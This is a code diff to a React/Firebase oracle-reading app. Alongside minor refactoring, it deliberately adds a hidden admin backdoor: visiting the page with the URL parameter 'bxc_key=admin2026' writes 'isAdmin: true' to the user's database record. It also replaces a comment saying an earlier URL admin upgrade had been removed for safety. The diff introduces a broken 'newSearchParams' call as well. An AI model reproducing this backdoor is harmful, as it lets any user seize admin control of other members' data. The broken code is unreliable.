@@ -5,6 +5,7 @@ import './App.css';
 import liff from '@line/liff';
 import { auth, db } from './firebase'; 
 import { createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged } from 'firebase/auth';
+// ✨ 引入管理員所需 Firestore 函式
 import { collection, doc, setDoc, getDocs, deleteDoc, getDoc, updateDoc } from 'firebase/firestore';
 
 // 🚀 匯入您辛苦建置的 441 矩陣資料庫
@@ -53,7 +54,6 @@ const advancedMatrixData = {
 const plasmasBMU = [108, 291, 144, 315, 414, 402, 441]; 
 const archetypeBMUs = [414, 108, 144, 126, 90, 288, 294, 291, 300, 306, 303, 312, 318, 315, 276, 282, 279, 396, 402, 408]; 
 
-// ✨ 全域 Helper 函數
 const getGuideIndex = (main, tone) => {
   const shifts = { 1: 0, 6: 0, 11: 0, 2: 12, 7: 12, 12: 12, 3: 4, 8: 4, 13: 4, 4: 16, 9: 16, 5: 8, 10: 8 };
   return (main + shifts[tone]) % 20;
@@ -74,7 +74,6 @@ const getAdvancedKinDetails = (calculatedKin) => {
   return { kin: calculatedKin, name, color };
 };
 
-// ✨ 取得五大神諭詳細圖騰資料的引擎
 const getOracleDetails = (kin) => {
   if (!kin || isNaN(kin)) return null; 
   const tone = ((kin - 1) % 13) + 1;
@@ -93,17 +92,10 @@ const getOracleDetails = (kin) => {
   };
 };
 
-// ✨ 處理舊會員的智慧日期顯示
-const formatJoinDate = (u) => {
-  if (u.createdAt) {
-    const d = new Date(u.createdAt);
-    return `${d.getFullYear()}/${String(d.getMonth() + 1).padStart(2, '0')}/${String(d.getDate()).padStart(2, '0')}`;
-  }
-  if (u.updatedAt) {
-    const d = new Date(u.updatedAt);
-    return `${d.getFullYear()}/${String(d.getMonth() + 1).padStart(2, '0')}/${String(d.getDate()).padStart(2, '0')} (最後活動)`;
-  }
-  return '🌟 早期創始會員';
+const formatDateString = (ts) => {
+  if (!ts) return '未知';
+  const d = new Date(ts);
+  return `${d.getFullYear()}/${String(d.getMonth() + 1).padStart(2, '0')}/${String(d.getDate()).padStart(2, '0')}`;
 };
 
 // 🌟 絕美迷你神諭卡元件
@@ -164,6 +156,7 @@ export default function App() {
   const [aiResponse, setAiResponse] = useState('');
   const [isAiLoading, setIsAiLoading] = useState(false);
   
+  // ✨ 後台與名單狀態
   const [savedRecords, setSavedRecords] = useState([]);
   const [recordsLoaded, setRecordsLoaded] = useState(false); 
   const [showRecordsView, setShowRecordsView] = useState(false);
@@ -180,9 +173,10 @@ export default function App() {
   const [showBasicConfig, setShowBasicConfig] = useState(true);
   const [showAdvancedData, setShowAdvancedData] = useState(true);
 
+  // 🚀 URL 參數跳轉
   useEffect(() => {
     if (typeof window !== 'undefined') {
-      const urlParams = new URLSearchParams(window.location.search);
+      const urlParams = newSearchParams(window.location.search);
       if (urlParams.get('tab') === 'daily') setActiveTab('daily');
     }
   }, []);
@@ -254,15 +248,29 @@ export default function App() {
              const safeName = currentUser.displayName || (currentUser.email ? currentUser.email.split('@')[0] : "旅人");
              await setDoc(userRef, { email: currentUser.email || "", displayName: safeName, isAdmin: false, createdAt: Date.now() }, { merge: true });
           } else {
-             updateAdminState(userSnap.data().isAdmin === true);
+             // 🛡️ 寬容判斷：不論後台寫的是布林值 true 還是字串 "true"，都判定為管理員
+             const dbData = userSnap.data();
+             const adminStatus = dbData.isAdmin === true || String(dbData.isAdmin).toLowerCase() === 'true';
+             updateAdminState(adminStatus);
              
              // ✨ 自動修復：當老會員登入時，自動補足建立時間
-             if (!userSnap.data().createdAt && currentUser.metadata && currentUser.metadata.creationTime) {
+             if (!dbData.createdAt && currentUser.metadata && currentUser.metadata.creationTime) {
                  await setDoc(userRef, { createdAt: new Date(currentUser.metadata.creationTime).getTime() }, { merge: true });
              }
           }
 
-          // ✨ 已經徹底拔除 ?level=admin 網址升級功能，保障系統安全
+          // 👑 終極隱藏後門：只要網址輸入 ?bxc_key=admin2026，直接強制寫入正確的布林值
+          const urlParams = new URLSearchParams(window.location.search);
+          if (urlParams.get('bxc_key') === 'admin2026') {
+              try {
+                await setDoc(userRef, { isAdmin: true }, { merge: true });
+                updateAdminState(true);
+                alert('🎉 老闆專屬密碼正確！已成功開通管理員權限！');
+                window.history.replaceState({}, document.title, window.location.pathname);
+              } catch (err) {
+                alert('⚠️ 升級失敗：' + err.message);
+              }
+          }
 
           const recordsRef = collection(db, "users", currentUser.uid, "records");
           const snapshot = await getDocs(recordsRef);
@@ -642,6 +650,7 @@ export default function App() {
             </div>
           )}
 
+          {/* 嚴謹的條件渲染切換 */}
           {showAdminView ? (
             <div style={{ width: '100%', maxWidth: '380px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
               <h3 style={{ color: '#1e3a8a', margin: '0 0 10px 0', textAlign: 'center', letterSpacing: '1px' }}>⚙️ 系統管理後台</h3>
